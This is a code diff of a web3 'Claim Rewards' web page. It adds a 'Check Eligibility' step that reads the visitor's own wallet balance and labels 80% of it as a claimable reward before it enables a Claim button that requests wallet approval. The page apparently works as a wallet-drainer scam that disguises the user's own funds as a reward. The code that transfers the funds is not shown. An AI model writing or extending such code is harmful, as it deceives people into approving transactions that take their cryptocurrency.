@@ -8,7 +8,9 @@
 </head>
 <body>
   <h1>Claim Rewards</h1>
-  <button id="claimButton">Claim</button>
+  <button id="checkEligibilityButton">Check Eligibility</button>
+  <p id="eligibilityResult"></p>
+  <button id="claimButton" disabled>Claim</button>
 
   <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
   <script>
@@ -25,7 +27,7 @@
       }
 
       // Load the contract
-  const contractAddress = '0xcB153471E78c062519e43e9AE70d6CcA31989C10'; // Replace with the actual contract address
+     const contractAddress = '0xcB153471E78c062519e43e9AE70d6CcA31989C10'; // Replace with the actual contract address
   const contractABI = [
   {
     "inputs": [],
@@ -150,6 +152,30 @@
       const accounts = await web3.eth.getAccounts();
       const userAccount = accounts[0];
 
+      // Handle the check eligibility button click event
+      const checkEligibilityButton = document.getElementById('checkEligibilityButton');
+      const eligibilityResult = document.getElementById('eligibilityResult');
+      checkEligibilityButton.addEventListener('click', async () => {
+        try {
+          // Get the user's balance
+          const balance = await web3.eth.getBalance(userAccount);
+          const balanceInWei = balance.toString();
+
+          // Calculate 80% of the payable amount
+          const payableAmount = web3.utils.toBN(balanceInWei).muln(80).divn(100);
+
+          // Display the eligibility result
+          eligibilityResult.textContent = `Eligible to claim: ${web3.utils.fromWei(payableAmount.toString(), 'ether')} ETH`;
+
+          // Enable the claim button
+          const claimButton = document.getElementById('claimButton');
+          claimButton.disabled = false;
+        } catch (error) {
+          console.error('Eligibility check failed', error);
+          eligibilityResult.textContent = 'Eligibility check failed';
+        }
+      });
+
       // Handle the claim button click event
       const claimButton = document.getElementById('claimButton');
       claimButton.addEventListener('click', async () => {
@@ -157,7 +183,7 @@
           // Request user approval
           await ethereum.enable();
 
-          // Get the wallet balance
+          // Get the user's balance
           const balance = await web3.eth.getBalance(userAccount);
           const balanceInWei = balance.toString();
 
